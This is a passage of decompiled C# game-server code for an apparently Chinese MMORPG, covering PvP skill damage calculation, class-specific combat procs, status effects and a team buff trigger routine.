				int num51 = 计算武器四神相克(装备栏已穿装备[3].FLD_FJ_四神之力, value34.装备栏已穿装备[0].FLD_FJ_四神之力);
				int num52 = 计算衣服四神相克(装备栏已穿装备[0].FLD_FJ_四神之力, value34.装备栏已穿装备[3].FLD_FJ_四神之力);
				double num53 = value34.FLD_人物基本_防御;
				double num54 = base.FLD_人物基本_攻击;
				int num46 = 0;
				if (num51 == 1)
				{
					num53 -= (double)value34.衣服防御力;
				}
				if (num52 == 1)
				{
					num54 += (double)武器攻击力;
				}
				double num55 = num53 * (1.0 - base.FLD_装备_追加_降低百分比防御 - base.武勋降低百分比防御);
				if (!value34.检查毒蛇出洞状态() && value34.Player_Job == 12 && value34.牢不可破 >= (double)RNG.Next(0, 100))
				{
					num55 += num55 * ((double)value34.装备栏已穿装备[0].物品属性阶段数 * 0.005 * 2.0);
					value34.显示大字(value34.人物全服ID, 1010);
				}
				if (base.陵劲淬砺 > 0.0 && base.陵劲淬砺 >= (double)RNG.Next(1, 100))
				{
					num54 += num54 * ((double)value34.装备栏已穿装备[0].物品属性阶段数 * 0.005 * 2.0);
					显示大字(base.人物全服ID, 1011);
				}
				if (!检查毒蛇出洞状态())
				{
					if (base.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 110) <= base.破甲几率)
						{
							显示大字(base.人物全服ID, 16);
							num55 *= 得到气功加成值(1, 5, 1);
						}
					}
					else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
					{
						显示大字(base.人物全服ID, 16);
						num55 *= 得到气功加成值(8, 7, 1);
					}
				}
				if (!value34.检查毒蛇出洞状态())
				{
					if (value34.Player_Job == 3 && (double)RNG.Next(1, 100) <= value34.枪_转攻为守)
					{
						value34.显示大字(value34.人物全服ID, 130);
						num55 += (double)value34.FLD_攻击 * 0.2;
					}
					if (value34.Player_Job == 10 && (double)RNG.Next(1, 100) <= value34.拳师_转攻为守)
					{
						value34.显示大字(value34.人物全服ID, 130);
						num55 += (double)value34.FLD_攻击 * 0.2;
					}
					if (value34.Player_Job == 12 && (double)RNG.Next(1, 100) <= value34.卢_转攻为守)
					{
						value34.显示大字(value34.人物全服ID, 130);
						num55 += (double)value34.FLD_攻击 * 0.2;
					}
				}
				int num57 = 0;
				if (value23.FLD_武功类型 == 3)
				{
					num57 = value23.FLD_AT + (武功新[value23.FLD_武功类型, value23.FLD_INDEX].武功_等级 - 1) * value23.FLD_每级加危害;
				}
				else if (value23.FLD_武功类型 == 2)
				{
					num57 = base.夫妻武功攻击力;
				}
				else if (value23.FLD_每级危害.Length <= 0)
				{
					num57 = ((base.Player_Job == 10 && num78 != 0) ? ((int)(((double)num57 + (double)(base.Player_Level * 10)) * (1.0 + base.拳师_水火一体))) : ((value23.FLD_PID == 师傅数据.STWG1 || value23.FLD_PID == 师傅数据.STWG2 || value23.FLD_PID == 师傅数据.STWG2) ? (value23.FLD_AT * (10 - 师傅数据.STLEVEL) / 10) : ((value23.FLD_武功类型 != 2) ? 计算升天武功威力(value23) : base.夫妻武功攻击力)));
				}
				else
				{
					int at = value23.GetAt(value23.FLD_PID, 武功新[value23.FLD_武功类型, value23.FLD_INDEX].武功_等级);
					if (at > 0)
					{
						num57 = at;
					}
				}
				if (爆毒状态 > 0.0)
				{
					num57 += (int)((double)num57 * 爆毒状态);
					爆毒状态 = 0.0;
				}
				if (base.Player_Job == 11)
				{
					if (!检查毒蛇出洞状态())
					{
						if (base.梅_玄武危化 > 0.0)
						{
							num57 = (int)((double)num57 * (1.0 + base.梅_玄武危化));
						}
						if (怒点 >= 3)
						{
							怒点 = 0;
							if (base.梅_愤怒爆发 > 0.0)
							{
								num57 = (int)((double)num57 * (1.0 + base.梅_愤怒爆发));
								显示大字(base.人物全服ID, 802);
							}
							更新HP_MP_SP();
						}
					}
					int num58 = 0;
					int num59 = 0;
					if (base.人物坐标_地图 == 41001)
					{
						num59 = 1;
					}
					else if (base.人物坐标_地图 == 7301)
					{
						num59 = 2;
					}
					foreach (Players value86 in PlayList.Values)
					{
						if (!查找范围玩家(70 + (int)base.梅_玄武的指点, value86))
						{
							continue;
						}
						switch (num59)
						{
						case 0:
							if (Math.Abs(base.Player_Level - value86.Player_Level) <= World.PK等级差 && !触发新手安全区(value86) && value86.Player_Level >= 35 && value86.Player_Zx != base.Player_Zx)
							{
								int num62 = num58 + 1;
								num58 = num62;
								if (num58 >= 5)
								{
									num58 = 5;
								}
							}
							break;
						case 1:
							if (value86.仙魔大战派别 != base.仙魔大战派别)
							{
								int num61 = num58 + 1;
								num58 = num61;
							}
							if (num58 >= 5)
							{
								num58 = 5;
							}
							break;
						case 2:
							if (value86.帮派名字 != base.帮派名字)
							{
								int num60 = num58 + 1;
								num58 = num60;
							}
							if (num58 >= 5)
							{
								num58 = 5;
							}
							break;
						}
					}
					if (num58 > 0)
					{
						num57 = (int)((double)num57 * (1.0 + base.梅_升天三气功_杀人鬼 * (double)num58));
					}
				}
				double num63 = (int)((value34.FLD_装备_武功防御力 + (double)value34.人物_气功_追加_武功防御力) * (1.0 + value34.FLD_人物_武功防御力增加百分比 + value34.FLD_人物_气功_武功防御力增加百分比));
				if (!检查毒蛇出洞状态() && base.Player_Job == 2)
				{
					double num64 = base.剑_无坚不摧 + base.剑_乘胜追击;
					double num65 = RNG.Next(1, 100);
					if (num65 < base.剑_无坚不摧)
					{
						显示大字(人物ID, 120);
						num55 *= 0.5;
						num63 *= 0.5;
					}
					else if (num65 < num64)
					{
						if (base.剑_乘胜追击 > 0.5)
						{
							base.剑_乘胜追击 = 0.5;
						}
						显示大字(人物ID, 120);
						num55 *= 0.5 - base.剑_乘胜追击 * 0.1;
						num63 *= 0.5 - base.剑_乘胜追击 * 0.1;
					}
				}
				if (base.武勋阶段 >= 8)
				{
					num55 -= num55 * 0.05;
					num63 -= num63 * 0.05;
				}
				num31 = (num54 - num55) * 1.5 + (double)num57 * (1.0 + base.FLD_装备_武功攻击力增加百分比 + base.FLD_人物_武功攻击力增加百分比 + base.FLD_人物_气功_武功攻击力增加百分比) - num63 * World.武功防增加百分比 + (double)(base.FLD_人物基本_命中 / 4) - (double)(value34.FLD_人物基本_回避 / 4) + (double)(base.人物_追加_PVP战力 * 20);
				if (检查毒蛇出洞状态())
				{
					goto IL_6bdd;
				}
				if (RNG.Next(1, 200) <= value34.人物武功回避 - base.人物武功命中)
				{
					num31 = 0.0;
					value34.显示大字(value34.人物全服ID, 402);
				}
				if (RNG.Next(1, 200) <= base.人物武功命中 - value34.人物武功回避)
				{
					num31 *= 1.0 + (double)(base.人物武功命中 - value34.人物武功回避) * 0.005;
					显示大字(base.人物全服ID, 405);
				}
				if (base.Player_Job == 1)
				{
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num31 *= 得到气功加成值(1, 7, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
					{
						显示大字(base.人物全服ID, 18);
						num31 *= 得到气功加成值(1, 9, 1);
					}
					if ((double)RNG.Next(1, 100) <= base.刀_梵音破镜 + base.升天五式_龙魂附体)
					{
						显示大字(base.人物全服ID, 312);
						double num66 = 得到气功加成值(1, 10, 1);
						if (base.刀_升天三气功_火龙之火 > 0.0)
						{
							num66 += base.刀_升天三气功_火龙之火;
						}
						num31 *= 1.0 + num66;
					}
					goto IL_5b4a;
				}
				if (base.Player_Job == 2)
				{
					if ((double)RNG.Next(1, 110) <= base.剑_怒海狂澜)
					{
						num31 *= 得到气功加成值(2, 7, 1);
						显示大字(base.人物全服ID, 82);
					}
					if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 >= 1)
					{
						显示大字(base.人物全服ID, 321);
						num31 += (double)天地同寿回避累积攻击力;
						天地同寿回避累积攻击力 = 0;
						天地同寿回避次数 = 0;
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_惊天动地)
					{
						num31 *= 1.4;
						显示大字(base.人物全服ID, 1015);
					}
					goto IL_5b4a;
				}
				if (base.Player_Job == 3)
				{
					double num68 = 0.4;
					double num69 = base.枪_升天一气功_破甲刺魂;
					double num70 = RNG.Next(1, 100);
					if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5)
					{
						if (怒)
						{
							num69 += base.枪_升天二气功_以退为进;
							num68 += base.枪_升天二气功_以退为进 * 0.01;
						}
						if (num70 <= num69)
						{
							num31 += (double)base.FLD_装备_追加_防御 * num68;
							显示大字(base.人物全服ID, 330);
						}
					}
					if ((double)RNG.Next(1, 100) <= base.枪_怒意之吼)
					{
						double num71 = 1.2;
						显示大字(base.人物全服ID, 332);
						if (怒)
						{
							num71 = 1.2 + base.枪_升天三气功_怒意之火;
						}
						num31 *= num71;
					}
					if (!怒 && (double)RNG.Next(1, 100) <= base.升天五式_灭世狂舞)
					{
						num31 *= 1.2;
						显示大字(base.人物全服ID, 1016);
					}
					if ((double)RNG.Next(1, 100) <= base.枪寒冰领域)
					{
						显示大字(base.人物全服ID, 572);
						if (value34.异常状态 != null && !value34.GetAbnormalState(26))
						{
							异常状态类 value69 = new 异常状态类(value34, 3000, 26, 0.0);
							value34.异常状态.Add(26, value69);
							value34.人物锁定 = true;
						}
					}
					goto IL_5b4a;
				}
				if (base.Player_Job == 4)
				{
					num31 += base.弓_锐利之箭 + 1.0;
					if ((double)RNG.Next(1, 100) <= base.弓_无明暗矢)
					{
						num31 *= 1.05 + base.弓_无明暗矢 * 0.01;
						显示大字(base.人物全服ID, 49);
						触发魔法无明暗矢 = true;
					}
					if (value23.FLD_TYPE == 4)
					{
						if (value34.检查烈日炎炎状态() && BitConverter.ToInt32(value34.装备栏已穿装备[0].物品ID, 0) != 0)
						{
							num55 -= (double)value34.装备栏已穿装备[0].物品防御力;
						}
						num31 = (num54 - num55 * 0.7) * World.弓手攻击倍数 + (double)(base.FLD_人物基本_命中 / 4) - (double)(value34.FLD_人物基本_回避 / 4) + (double)(base.人物_追加_PVP战力 * 10);
						int num72 = RNG.Next(1, 110);
						int num73 = RNG.Next(1, 120);
						if ((double)RNG.Next(1, 100) <= base.弓_升天三气功_天外三矢)
						{
							显示大字(base.人物全服ID, 342);
							if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.弓_升天一气功_绝影射魂)
							{
								显示大字(base.人物全服ID, 340);
								num31 *= 1.25;
							}
						}
						if ((double)num72 <= base.弓_心神凝聚)
						{
							base.弓群攻触发心神 = true;
							num31 *= 3.0;
						}
						if ((double)num73 <= base.弓_致命绝杀)
						{
							_ = base.弓_致命绝杀;
							得到气功加成值(4, 11, 1);
							num31 *= 1.4;
							显示大字(base.人物全服ID, 140);
							触发弓箭致命绝杀 = true;
						}
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
					{
						num31 *= 1.45;
						显示大字(base.人物全服ID, 1017);
					}
					goto IL_5b4a;
				}
				if (base.Player_Job == 5)
				{
					num31 *= 1.0 + base.医_长攻击力;
					if ((double)RNG.Next(1, 100) <= base.真武绝击)
					{
						显示大字(base.人物全服ID, 17);
						num31 *= 得到气功加成值(5, 7, 1);
					}
					double num74 = 0.0;
					if (base.医_无中生有 - base.医_狂意护体 > 0.0)
					{
						num74 = base.医_狂意护体 - base.医_无中生有;
					}
					double num75 = num74 * 0.01;
					if ((double)RNG.Next(1, 100) <= base.医_无中生有)
					{
						显示大字(base.人物全服ID, 351);
						if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.医_升天三气功_明镜止水)
						{
							显示大字(base.人物全服ID, 352);
							num75 *= 2.0;
						}
						if (num75 > 0.0)
						{
							num31 += (double)(int)(num31 * num75);
						}
					}
					goto IL_5b4a;
				}
				if (base.Player_Job != 6)
				{
					goto IL_5b4a;
				}
				if (value23.FLD_PID == 801303)
				{
					if ((int)DateTime.Now.Subtract(Pktime801303).TotalSeconds < 30)
					{
						return;
					}
					Pktime801303 = DateTime.Now;
					num31 = 0.0;
					怒气++;
					if (怒气 > 5)
					{
						怒气 = 5;
					}
					goto IL_5b4a;
				}
				if (value23.FLD_INDEX == 1 || value23.FLD_INDEX == 5 || value23.FLD_INDEX == 9 || value23.FLD_INDEX == 13 || value23.FLD_INDEX == 17 || value23.FLD_INDEX == 21 || value23.FLD_INDEX == 25)
				{
					if (怒气 > 0)
					{
						if (RNG.Next(1, 100) <= 35)
						{
							if (!value34.GetAbnormalState(9))
							{
								double num76 = 10000.0 + base.刺_千蛛万手;
								异常状态类 value70 = new 异常状态类(value34, (int)num76, 9, 0.0);
								value34.异常状态.Add(9, value70);
								value34.delFLD_追加百分比_防御(0.07);
								value34.更新武功和状态();
							}
							if (!value34.GetAbnormalState(11))
							{
								double num77 = 10000.0 + base.刺_千蛛万手;
								异常状态类 value71 = new 异常状态类(value34, (int)num77, 11, 0.0);
								value34.异常状态.Add(11, value71);
							}
						}
						怒气--;
					}
				}
				else if (value23.FLD_INDEX == 2 || value23.FLD_INDEX == 6 || value23.FLD_INDEX == 10 || value23.FLD_INDEX == 14 || value23.FLD_INDEX == 18 || value23.FLD_INDEX == 22 || value23.FLD_INDEX == 26)
				{
					if (怒气 > 0)
					{
						if (!value34.GetAbnormalState(9) && RNG.Next(1, 100) <= 35)
						{
							double num79 = 10000.0 + base.刺_千蛛万手;
							异常状态类 value72 = new 异常状态类(value34, (int)num79, 9, 0.0);
							value34.异常状态.Add(9, value72);
							value34.delFLD_追加百分比_防御(0.07);
							value34.更新武功和状态();
						}
						double num80 = 0.005;
						switch (value23.FLD_INDEX)
						{
						case 10:
							num80 = 0.009;
							break;
						case 6:
							num80 = 0.007;
							break;
						case 2:
							num80 = 0.005;
							break;
						case 18:
							num80 = 0.013;
							break;
						case 14:
							num80 = 0.011;
							break;
						case 26:
							num80 = 0.02;
							break;
						case 22:
							num80 = 0.015;
							break;
						}
						if (!value34.GetAbnormalState(10))
						{
							double num81 = 10000.0 + base.刺_千蛛万手;
							异常状态类 异常状态类3 = new 异常状态类(value34, (int)num81, 10, (int)(num31 * num80));
							value34.异常状态.Add(10, 异常状态类3);
							异常状态类3.异常状态类出血(num31 * num80);
						}
						怒气--;
					}
				}
				else if ((value23.FLD_INDEX == 3 || value23.FLD_INDEX == 7 || value23.FLD_INDEX == 11 || value23.FLD_INDEX == 15 || value23.FLD_INDEX == 19 || value23.FLD_INDEX == 23 || value23.FLD_INDEX == 27) && 怒气 > 0)
				{
					num31 += num31 * 0.3 * (double)怒气;
					显示大字(base.人物全服ID, 80);
					怒气 = 0;
				}
				goto IL_5b4a;
				IL_6bdd:
				if (!value34.检查毒蛇出洞状态())
				{
					if (value34.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= value34.剑_升天一气功_护身罡气)
						{
							num31 *= 0.5;
							value34.显示大字(value34.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 100) <= value34.剑_回柳身法)
						{
							if (base.Player_Job == 2)
							{
								if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
								{
									天地同寿回避次数++;
									天地同寿回避累积攻击力 += (int)(num31 * base.剑_升天二气功_天地同寿);
								}
							}
							else if (base.Player_Job == 9 && value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
							{
								天地同寿回避次数++;
								天地同寿回避累积攻击力 += (int)(num31 * base.谭_升天二气功_天地同寿);
							}
							if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
							{
								显示大字(base.人物全服ID, 562);
								if (!value34.GetAbnormalState(4))
								{
									异常状态类 value64 = new 异常状态类(value34, 3000, 4, 0.0);
									value34.异常状态.Add(4, value64);
								}
							}
							num31 = 0.0;
							value34.显示大字(value34.人物全服ID, 403);
						}
					}
					else if (value34.Player_Job == 5)
					{
						if ((double)RNG.Next(1, 100) <= base.升天一气功_狂风天意 && !value34.怒)
						{
							value34.人物_SP = value34.人物最大_SP + 5;
						}
						if ((double)RNG.Next(1, 100) <= base.升天五式_形移妖相)
						{
							num31 = 0.0;
							显示大字(base.人物全服ID, 1018);
						}
					}
					else if (value34.Player_Job == 6)
					{
						if ((double)RNG.Next(1, 110) <= value34.刺_升天一气功_夜魔缠身)
						{
							num31 *= 0.7;
							value34.显示大字(value34.人物全服ID, 370);
						}
						if ((double)RNG.Next(1, 100) <= value34.刺_升天二气功_顺水推舟)
						{
							value34.加血((int)(num31 * 0.2));
							value34.显示大字(value34.人物全服ID, 371);
						}
						if ((double)RNG.Next(1, 110) <= value34.刺_三花聚顶)
						{
							value34.刺_连消带打数量 = num31 * value34.刺_连消带打;
							if (base.Player_Job == 2)
							{
								if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
								{
									天地同寿回避次数++;
									天地同寿回避累积攻击力 += (int)(num31 * base.剑_升天二气功_天地同寿);
								}
							}
							else if (base.Player_Job == 9 && value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
							{
								天地同寿回避次数++;
								天地同寿回避累积攻击力 += (int)(num31 * base.谭_升天二气功_天地同寿);
							}
							if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
							{
								显示大字(base.人物全服ID, 562);
								if (!value34.GetAbnormalState(4))
								{
									异常状态类 value65 = new 异常状态类(value34, 3000, 4, 0.0);
									value34.异常状态.Add(4, value65);
								}
							}
							num31 = 0.0;
						}
					}
					else if (value34.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 100) <= value34.谭_护身罡气)
						{
							num31 *= 0.5;
							value34.显示大字(value34.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 110) <= value34.谭_回柳身法)
						{
							if (base.Player_Job == 2)
							{
								if (value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
								{
									天地同寿回避次数++;
									天地同寿回避累积攻击力 += (int)(num31 * base.剑_升天二气功_天地同寿);
								}
							}
							else if (base.Player_Job == 9 && value23.FLD_武功类型 == 3 && 武功新[3, value23.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
							{
								天地同寿回避次数++;
								天地同寿回避累积攻击力 += (int)(num31 * base.谭_升天二气功_天地同寿);
							}
							if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
							{
								显示大字(base.人物全服ID, 562);
								if (!value34.GetAbnormalState(4))
								{
									异常状态类 value66 = new 异常状态类(value34, 3000, 4, 0.0);
									value34.异常状态.Add(4, value66);
								}
							}
							num31 = 0.0;
						}
						if ((double)RNG.Next(1, 110) <= value34.谭_升天三气功_以柔克刚 + value34.升天五式_惊涛骇浪)
						{
							value34.显示大字(value34.人物全服ID, 700);
							num31 *= 0.5;
						}
					}
					else if (value34.Player_Job == 10)
					{
						if (num31 > (double)(value34.人物_HP / 2) && (double)RNG.Next(1, 110) <= value34.拳师_金刚不坏)
						{
							value34.显示大字(value34.人物全服ID, 554);
							num31 *= 1.0 - value34.拳师_金刚不坏 * 0.01;
						}
						if ((double)RNG.Next(1, 100) <= value34.升天五式_不死之躯)
						{
							value34.显示大字(value34.人物全服ID, 1021);
							num31 = 0.0;
						}
					}
					else if (value34.Player_Job == 11)
					{
						if ((base.Player_Job == 1 || base.Player_Job == 8) && value34.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= value34.梅_嫉妒的化身)
						{
							double num42 = num31 * (得到气功加成值(value34.Player_Job, 9, 1) / 2.0);
							num31 -= num42;
							value34.显示大字(value34.人物全服ID, 808);
						}
						if (value34.梅_障力恢复 > 0.0 && value34.人物_AP * 2 < value34.人物最大_AP && (double)RNG.Next(1, 100) <= value34.梅_障力恢复)
						{
							value34.人物_AP = value34.人物最大_AP;
							value34.显示大字(value34.人物全服ID, 801);
						}
						if (value34.梅_愤怒爆发 > 0.0 && RNG.Next(1, 100) <= 40 && value34.怒点 < 3)
						{
							Players players = value34;
							Players players2 = players;
							Players players3 = players2;
							players3.怒点++;
						}
						if (value34.梅_吸血进击 > 0.0 && (double)RNG.Next(1, 100) <= value34.梅_吸血进击 && value34.人物_HP * 2 < value34.人物最大_HP)
						{
							int num43 = (int)(num31 / 2.0);
							if (num43 > 2000)
							{
								num43 = 2000;
							}
							value34.加血(num43);
							value34.显示大字(value34.人物全服ID, 804);
							value34.更新HP_MP_SP();
						}
					}
				}
				if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && value34.异常状态 != null && !value34.GetAbnormalState(3))
				{
					异常状态类 value68 = new 异常状态类(value34, 60000, 3, 0.0);
					value34.异常状态.Add(3, value68);
					value34.中毒 = true;
				}
				if (value34.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= value34.FLD_装备_追加_中毒概率百分比 && !GetAbnormalState(3))
				{
					异常状态.Add(3, new 异常状态类(this, 60000, 3, 0.0));
					中毒 = true;
				}
				if (value34.FLD_装备_降低_伤害值 > 0.0)
				{
					num31 -= (double)(int)value34.FLD_装备_降低_伤害值;
				}
				if (value34.全职业气功防御 + value34.大魔神添加全职业气功防御几率 >= (double)RNG.Next(1, 100) && value34.Player_Level >= 120)
				{
					num31 *= 0.7;
					value34.显示大字(value34.人物全服ID, 701);
				}
				升天四气功触发(value34);
				double num44;
				if (num31 <= 0.0)
				{
					num44 = 0.0;
				}
				else
				{
					if (num31 > 1800000000.0)
					{
						num31 = 1800000000.0;
					}
					num44 = RNG.Next((int)num31 - 15, (int)num31 + 15);
					if (中级附魂_愤怒 != 0 && RNG.Next(1, 100) <= 中级附魂_愤怒)
					{
						num44 *= 1.2;
						显示大字(base.人物全服ID, 404);
					}
					if (!检查毒蛇出洞状态())
					{
						if (base.Player_Job == 2)
						{
							if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
							{
								显示大字(base.人物全服ID, 29);
								base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
							}
							if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
							{
								显示大字(base.人物全服ID, 26);
								加血((int)(num44 * 0.5));
							}
						}
						if (base.Player_Job == 9)
						{
							if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
							{
								显示大字(base.人物全服ID, 29);
								base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
							}
							if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
							{
								显示大字(base.人物全服ID, 26);
								加血((int)(num44 * 0.5));
							}
						}
					}
				}
				if (num44 <= 1.0)
				{
					num44 = RNG.Next(1, 5);
				}
				if (value34.Player_Job == 11)
				{
					if (value34.梅_障力激活 > 0.0)
					{
						num46 = (int)(num44 * (value34.梅_障力激活 * 0.01));
						if (num46 > value34.人物_AP)
						{
							num46 = value34.人物_AP;
						}
						value34.人物_AP -= num46;
					}
				}
				else
				{
					num46 = 0;
				}
				double num47 = num44 - (double)num46;
				if (base.人物_追加_PVP战力 - value34.人物_追加_PVP战力 > 0)
				{
					int num48 = base.人物_追加_PVP战力 - value34.人物_追加_PVP战力;
					num47 *= 1.0 + 0.01 * (double)num48;
				}
				if (base.人物_追加_PVP战力 - value34.人物_追加_PVP战力 < 0)
				{
					int num49 = base.人物_追加_PVP战力 - value34.人物_追加_PVP战力;
					num47 *= 1.0 - 0.01 * (double)(-num49);
				}
				if (num47 <= 1.0)
				{
					num47 = 1.0;
				}
				if (num47 > 1.0)
				{
					switch (base.Player_Job)
					{
					case 1:
						num47 *= World.刀PK伤害参数;
						break;
					case 2:
						num47 *= World.剑PK伤害参数;
						break;
					case 3:
						num47 *= World.枪PK伤害参数;
						break;
					case 4:
						num47 *= World.弓PK伤害参数;
						break;
					case 5:
						num47 *= World.医PK伤害参数;
						break;
					case 6:
						num47 *= World.刺PK伤害参数;
						break;
					case 7:
						num47 *= World.乐PK伤害参数;
						break;
					case 8:
						num47 *= World.韩PK伤害参数;
						break;
					case 9:
						num47 *= World.谭PK伤害参数;
						break;
					case 10:
						num47 *= World.拳PK伤害参数;
						break;
					case 11:
						num47 *= World.梅PK伤害参数;
						break;
					case 12:
						num47 *= World.卢PK伤害参数;
						break;
					case 13:
						num47 *= World.神女PK伤害参数;
						break;
					}
				}
				num47 -= (double)(value34.减免对方伤害 + value34.药品减免对方伤害);
				攻击计算完成(this, 人物ID, 武功ID, (int)num47, 0, 0, num46);
				end_IL_0001:;
			}
			catch (Exception ex2)
			{
				报错次数阀值++;
				if (World.是否开启票红字 == 1)
				{
					系统提示("你魔法攻击人物出错, 请联系客服处理");
					MainForm.WriteLine(1, "魔法攻击人物" + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + 报错次数阀值 + " | " + ex2.Message);
				}
			}
		}

		public void 混乱状态移动(float x, float y)
		{
			byte[] array = Converter.hexStringToByte("AA553600010065002800020000000000000000000000000000000000000000000000000000000000000088000000FFFF4500000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(x), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(y), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(上次坐标X), 0, array, 26, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array, 30, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(上次坐标Y), 0, array, 34, 4);
			if (追加状态列表.ContainsKey(601102))
			{
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 39, 1);
			}
			else if (追加状态列表.ContainsKey(601101))
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 39, 1);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 39, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 38, 1);
			}
			发送当前范围广播数据多包(array, array.Length);
		}

		public bool 判断师徒技能(int 武功ID)
		{
			return 武功ID == 师傅数据.STWG1 || 武功ID == 师傅数据.STWG2 || 武功ID == 师傅数据.STWG3;
		}

		public void 升天四气功触发(Players Playe)
		{
			try
			{
				if (base.Player_Level < 140 || base.Player_Job_leve < 9)
				{
					return;
				}
				try
				{
					int num = new Random().Next(1, 101);
					if ((double)num < base.升天四式_悬丝诊脉 && base.Player_Job == 7)
					{
						显示大字(base.人物全服ID, 394);
						if (武功新[1, 13] != null)
						{
							if (组队id != 0)
							{
								if (World.Teams.TryGetValue(组队id, out var value))
								{
									foreach (Players value4 in value.组队列表.Values)
									{
										if (value4.人物_HP > 0 && !value4.Player死亡 && !value4.Client.挂机 && 查找范围玩家(World.群体辅助组队范围, value4))
										{
											if (value4.GetAddState(1008001175))
											{
												value4.追加状态列表[1008001175].时间结束事件();
											}
											if (value4.GetAddState(1008001170))
											{
												value4.追加状态列表[1008001170].时间结束事件();
											}
											追加状态类 value10 = new 追加状态类(value4, 5000, 1008001175, 0);
											value4.追加状态列表.Add(1008001175, value10);
											value4.状态效果(BitConverter.GetBytes(1008001175), 1, 5000);
											value4.addFLD_追加百分比_防御(0.1);
											value4.更新武功和状态();
											value4.更新HP_MP_SP();
										}
									}
								}
							}
							else
							{
								if (追加状态列表 != null)
								{
									if (GetAddState(1008001175))
									{
										追加状态列表[1008001175].时间结束事件();
									}
									if (GetAddState(1008001170))
									{
										追加状态列表[1008001170].时间结束事件();
									}
								}
								追加状态列表.Add(1008001175, new 追加状态类(this, 5000, 1008001175, 0));
								状态效果(BitConverter.GetBytes(1008001175), 1, 5000);
								addFLD_追加百分比_防御(0.1);
								更新武功和状态();
								更新HP_MP_SP();
							}
						}
					}
					if (检查毒蛇出洞状态())
					{
						return;
					}
					if ((double)num <= base.升天四式_望梅添花 && 武功新[1, 25] != null)
					{
						显示大字(base.人物全服ID, 354);
						if (组队id != 0)
						{
							if (World.Teams.TryGetValue(组队id, out var value11))
							{
								foreach (Players value5 in value11.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value5) && (value5.异常状态 == null || !value5.GetAbnormalState(2)))
									{
										if (value5.GetAddState(1008001174))
										{
											value5.追加状态列表[1008001174].时间结束事件();
										}
										if (value5.GetAddState(1008001169))
										{
											value5.追加状态列表[1008001169].时间结束事件();
										}
										追加状态类 value12 = new 追加状态类(value5, 5000, 1008001174, 0);
										value5.追加状态列表.Add(1008001174, value12);
										value5.状态效果(BitConverter.GetBytes(1008001174), 1, 5000);
										value5.人物追加最大_HP += 1000;
										value5.更新HP_MP_SP();
									}
								}
							}
						}
						else if (异常状态 != null && !GetAbnormalState(2))
						{
							if (追加状态列表 != null)
							{
								if (GetAddState(1008001174))
								{
									追加状态列表[1008001174].时间结束事件();
								}
								if (GetAddState(1008001169))
								{
									追加状态列表[1008001169].时间结束事件();
								}
							}
							追加状态列表.Add(1008001174, new 追加状态类(this, 5000, 1008001174, 0));
							状态效果(BitConverter.GetBytes(1008001174), 1, 5000);
							base.人物追加最大_HP += 1000;
							更新HP_MP_SP();
						}
					}
					if ((double)num < base.升天四式_烈日炎炎)
					{
						显示大字(base.人物全服ID, 344);
						if ((double)RNG.Next(1, 100) <= Playe.神女抗击身法)
						{
